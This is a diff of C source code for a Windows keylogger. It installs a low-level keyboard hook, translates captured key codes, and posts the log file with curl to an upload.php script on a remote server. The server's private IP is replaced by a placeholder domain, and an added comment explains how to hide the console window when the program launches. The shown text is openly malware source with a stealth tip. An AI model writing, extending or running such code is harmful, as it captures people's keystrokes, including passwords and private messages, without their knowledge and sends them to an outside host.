@@ -17,27 +17,21 @@ int subirArchivo(void){
     curl = curl_easy_init();
 
     if (curl) {
-        // URL del script PHP que recibirá el archivo
-        const char* url = "http://192.168.8.107/upload.php";
+        const char* url = "http://your-domain-here/upload.php"; // This is the url were the logs are going to be uploaded, im using "upload.php" for managing the requests with curl.
 
-        // Ruta completa del archivo que deseas enviar
-        const char* filePath = "archivo.txt";
+        const char* filePath = "/path/to/file"; // path to the file 
 
         struct curl_httppost *post = NULL;
         struct curl_httppost *last = NULL;
 
-        // Añade el archivo al formulario POST
         curl_formadd(&post, &last, CURLFORM_COPYNAME, "archivo", CURLFORM_FILE, filePath, CURLFORM_END);
 
-        // Configura la solicitud POST
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
-
-        // Realiza la solicitud
-        printf("*** ENVIANDO ARCHIVO ***\n");
-        res = curl_easy_perform(curl);
-
-        // Limpia y libera recursos
+        // sending the request
+        printf("*** SENDINF FILE ***\n"); 
+        res = curl_easy_perform(curl); 
+        // cleaning
         curl_easy_cleanup(curl);
         curl_formfree(post);
 
@@ -51,7 +45,7 @@ int subirArchivo(void){
 }
 
 
-
+// function for processing especial keys vkcodes
 char * translateSpecialKey(DWORD vkcode){
     SHORT shiftState = GetAsyncKeyState(0xa0);
     char * realKey = NULL;
@@ -100,7 +94,6 @@ char * translateSpecialKey(DWORD vkcode){
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     char * specialK;
     if (nCode >= 0) {
-        // Se está procesando el mensaje de teclado
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
             specialK = translateSpecialKey(pKbStruct->vkCode);
@@ -129,11 +122,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         }
     }
 
-    // Llama al siguiente hook en la cadena
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-// int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+// int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) -> this line is for creating a WINDOWS program, this is useful for not showing cmd popup when launching the program
 int main(void){
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
 
